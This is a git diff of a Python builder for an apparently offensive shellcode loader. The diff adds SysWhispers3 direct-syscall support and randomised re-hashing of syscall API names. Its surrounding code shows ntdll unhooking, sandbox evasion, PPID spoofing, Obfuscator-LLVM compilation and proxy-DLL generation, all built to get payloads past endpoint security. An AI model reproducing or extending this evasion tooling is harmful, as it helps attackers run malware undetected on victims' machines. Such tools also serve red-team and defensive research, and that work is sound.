@@ -1867,23 +1867,41 @@ unhook_call = """
 """
 
 # Thanks to @S4ntiagoP and @Snovvcrash for the API hashing code
-def get_old_seed():
-    with open('Syscalls.h') as f:
-        code = f.read()
-    match = re.search(r'#define SW2_SEED (0x[a-fA-F0-9]{8})', code)
-    assert match is not None, 'SW2_SEED not found!'
-    return match.group(1)
+def get_old_seed(syscall_arg):
+    if syscall_arg == "syswhispers2":
+        with open('SW2Syscalls.h') as f:
+            code = f.read()
+        match = re.search(r'#define SW2_SEED (0x[a-fA-F0-9]{8})', code)
+        assert match is not None, 'SW2_SEED not found!'
+        return match.group(1)
+    elif syscall_arg == "syswhispers3":
+        with open('SW3Syscalls.h') as f:
+            code = f.read()
+        match = re.search(r'#define SW3_SEED (0x[a-fA-F0-9]{8})', code)
+        assert match is not None, 'SW3_SEED not found!'
+        return match.group(1)
 
-def replace_seed(old_seed, new_seed):
-    with open('Syscalls.h') as f:
-        code = f.read()
-    code = code.replace(
-        f'#define SW2_SEED {old_seed}',
-        f'#define SW2_SEED 0x{new_seed:08X}',
-        1
-    )
-    with open('Syscalls.h', 'w') as f:
-        f.write(code)
+def replace_seed(old_seed, new_seed, syscall_arg):
+    if syscall_arg == "syswhispers2":
+        with open('SW2Syscalls.h') as f:
+            code = f.read()
+        code = code.replace(
+            f'#define SW2_SEED {old_seed}',
+            f'#define SW2_SEED 0x{new_seed:08X}',
+            1
+        )
+        with open('SW2Syscalls.h', 'w') as f:
+            f.write(code)
+    elif syscall_arg == "syswhispers3":
+        with open('SW3Syscalls.h') as f:
+            code = f.read()
+        code = code.replace(
+            f'#define SW3_SEED {old_seed}',
+            f'#define SW3_SEED 0x{new_seed:08X}',
+            1
+        )
+        with open('SW3Syscalls.h', 'w') as f:
+            f.write(code)
 
 def get_function_hash(seed, function_name):
     function_hash = seed
@@ -1900,14 +1918,20 @@ def get_function_hash(seed, function_name):
 
     return function_hash
 
-def replace_syscall_hashes(seed):
-    with open('Syscalls.h') as f:
+def replace_syscall_hashes(seed, syscall_arg):
+    if syscall_arg == "syswhispers2":
+        syscallFileName = "SW2Syscalls.h"
+        getSyscallNumFunc = "SW2_GetSyscallNumber"
+    elif syscall_arg == "syswhispers3":
+        syscallFileName = "SW3Syscalls.h"
+        getSyscallNumFunc = "SW3_GetSyscallNumber"
+    with open(syscallFileName) as f:
         code = f.read()
     regex = re.compile(r'#define (Nt[^(]+) ')
     syscall_names = re.findall(regex, code)
     syscall_names.extend(["NewNtClose", "NewNtQueryInformationProcess", "NewNtWaitForSingleObject"])
     syscall_names = set(syscall_names)
-    syscall_definitions = code.split('EXTERN_C DWORD SW2_GetSyscallNumber')[2]
+    syscall_definitions = code.split(f'EXTERN_C DWORD {getSyscallNumFunc}')[2]
 
     for syscall_name in syscall_names:
         regex = re.compile('#define ' + syscall_name + '.*?mov ecx, (0x0[A-Fa-f0-9]{8})', re.DOTALL)
@@ -1921,7 +1945,7 @@ def replace_syscall_hashes(seed):
             f'0x0{new_hash:08X}'
         )
 
-    with open('Syscalls.h', 'w') as f:
+    with open(syscallFileName, 'w') as f:
         f.write(code)
 
 def generateKey(length):
@@ -2093,14 +2117,15 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_UNHOOKING_DEFINTIONS", unhook_definitions)
         stub = stub.replace("REPLACE_ME_NTDLL_UNHOOK", unhook_ntdll)
         stub = stub.replace("REPLACE_ME_CALL_UNHOOK", unhook_call)
-        if syscall_arg == "getsyscallstub":
-            print("[+] Disabling GetSyscallStub as it is not needed when used with unhooking")
+        if syscall_arg != "none":
+            print(f"[+] Disabling {syscall_arg} as it is not needed when used with unhooking")
             syscall_arg = "none"
     else:
         stub = stub.replace("REPLACE_UNHOOKING_DEFINTIONS", "")
         stub = stub.replace("REPLACE_ME_NTDLL_UNHOOK", "")
         stub = stub.replace("REPLACE_ME_CALL_UNHOOK", "")
 
+    syscallFileName = "SW2Syscalls.h"
     if syscall_arg == "getsyscallstub":
         print("[+] Using GetSyscallStub for syscalls")
         stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#pragma comment(lib, "ntdll")')
@@ -2112,16 +2137,21 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P1", NoSyscall_StubP1)
         stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", NoSyscall_StubP2)
     else:
-        print("[+] Using SysWhispers2 for syscalls")
+        if syscall_arg == "syswhispers2":
+            print("[+] Using SysWhispers2 for syscalls")
+            syscallFileName = "SW2Syscalls.h"
+        elif syscall_arg == "syswhispers3":
+            print("[+] Using SysWhispers3 for syscalls")
+            syscallFileName = "SW3Syscalls.h"
         stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#include "Syscalls2.h"')
         stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P1", "")
         stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", "")
         print("[+] Re-hashing API syscalls")
         new_seed = random.randint(2 ** 28, 2 ** 32 - 1)
         #new_seed = 0x1337C0DE
-        old_seed = get_old_seed()
-        replace_seed(old_seed, new_seed)
-        replace_syscall_hashes(new_seed)
+        old_seed = get_old_seed(syscall_arg)
+        replace_seed(old_seed, new_seed, syscall_arg)
+        replace_syscall_hashes(new_seed, syscall_arg)
 
     if no_ppid_spoof == True:
         print("[+] PPID Spoofing has been disabled")
@@ -2143,7 +2173,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_ME_HOSTNAME", sandbox_arg)
         stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "hostcheck();")
     elif sandbox == "username":
-        print("[+] Using hostname enumeration for sandbox evasion")
+        print("[+] Using username enumeration for sandbox evasion")
         stub = stub.replace("REPLACE_SANDBOX_CHECK", username_sanbox_check)
         stub = stub.replace("REPLACE_ME_USERNAME", sandbox_arg)
         stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "usercheck();")
@@ -2181,7 +2211,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_DLL_MAIN", "")
 
     #Randomize Syscall names
-    f = open("Syscalls.h", "r")
+    f = open(syscallFileName, "r")
     syscall_contents = f.read()
     f.close()
     if no_randomize != True:
@@ -2251,7 +2281,7 @@ parser.add_argument('-ns', '--no-sandbox', action='store_true', help='Disable sa
 parser.add_argument('-np', '--no-ppid-spoof', action='store_true', help='Disable PPID spoofing')
 parser.add_argument('-l', '--llvm-obfuscator', action='store_true', help='Use Obfuscator-LLVM to compile stub')
 parser.add_argument('-v', '--verbose', action='store_true', help='Enable debugging messages upon execution')
-parser.add_argument('-sc', '--syscall', dest='syscall_arg', help='Syscall execution method (Options: SysWhispers2, GetSyscallStub, None) (Default: GetSyscallStub)', metavar='GetSyscallStub', default='GetSyscallStub')
+parser.add_argument('-sc', '--syscall', dest='syscall_arg', help='Syscall execution method (Options: SysWhispers2, SysWhispers3, GetSyscallStub, None) (Default: GetSyscallStub)', metavar='GetSyscallStub', default='GetSyscallStub')
 parser.add_argument('-d', '--dll', action='store_true', help='Generate a DLL instead of EXE')
 parser.add_argument('-dp', '--dll-proxy', dest='dll_proxy', metavar='apphelp.dll', help='Create Proxy DLL using supplied legitimate DLL (File must exist in current dir)')
 parser.add_argument('-s', '--sandbox', dest='sandbox', help='Sandbox evasion technique (Options: sleep, domain, hostname, username, dll) (Default: sleep)', metavar='domain', default='sleep')
